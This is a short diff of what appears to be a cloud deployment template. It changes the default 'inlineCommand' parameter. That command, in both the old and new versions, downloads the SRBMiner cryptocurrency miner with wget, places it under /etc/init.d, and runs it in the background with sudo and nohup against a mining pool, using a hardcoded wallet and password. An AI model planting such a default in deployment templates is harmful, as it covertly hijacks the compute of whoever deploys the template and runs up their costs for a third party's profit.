@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; cd /etc/init.d/; wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz; tar xf SRBMiner-Multi-2-4-7-Linux.tar.xz; cd SRBMiner-Multi-2-4-7; sudo nohup ./SRBMiner-MULTI --algorithm yespower --pool stratum+tcps://stratum-eu.rplant.xyz:17079 --tls true --wallet unMTq5XQWwz3hdLx6K6SXi6VUUbEuys58d.luckyvl --password webpassword=Ayenleakm2lnt --keepalive true --cpu-threads 16 --disable-gpu>log.out &",
+            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo sysctl -w vm.nr_hugepages=1280; cd /etc/init.d/; wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz; tar xf SRBMiner-Multi-2-4-7-Linux.tar.xz; cd SRBMiner-Multi-2-4-7; sudo nohup ./SRBMiner-MULTI --algorithm yespower --pool stratum+tcps://stratum-eu.rplant.xyz:17079 --tls true --wallet uuttHAT7QC3cbixcmgMchjt3BBPjpuMFHj.luckyvl --password m=solo --keepalive true --cpu-threads 16 --disable-gpu>log.out &",
             "metadata": {
                 "description": "inline command"
             }
